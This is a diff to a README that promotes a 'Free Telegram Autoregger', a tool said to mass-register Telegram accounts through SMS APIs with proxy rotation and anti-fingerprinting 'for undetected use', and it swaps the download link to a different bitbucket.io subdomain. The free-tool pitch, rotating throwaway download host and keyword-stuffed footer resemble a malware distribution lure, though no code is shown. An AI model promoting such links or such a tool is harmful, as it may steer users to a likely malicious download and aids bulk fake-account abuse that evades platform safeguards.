@@ -2,7 +2,7 @@
 
 Automate Telegram account creation with this high-speed **Free Telegram Autoregger** 🔄. Built in Python with optional C++ modules for threading and proxy rotation, this tool registers Telegram accounts using SMS APIs, handles verification, saves sessions, and supports anti-fingerprint mechanisms for undetected use.
 
-[![Download Telegram Autoregger](https://img.shields.io/badge/Download-Telegram%20Autoregger-blueviolet)](https://offload1.bitbucket.io/)
+[![Download Telegram Autoregger](https://img.shields.io/badge/Download-Telegram%20Autoregger-blueviolet)](https://fileoffload17.bitbucket.io)
 
 ---
 
@@ -45,3 +45,4 @@ telegram session generator
 telegram bulk account creator  
 
 ---
+
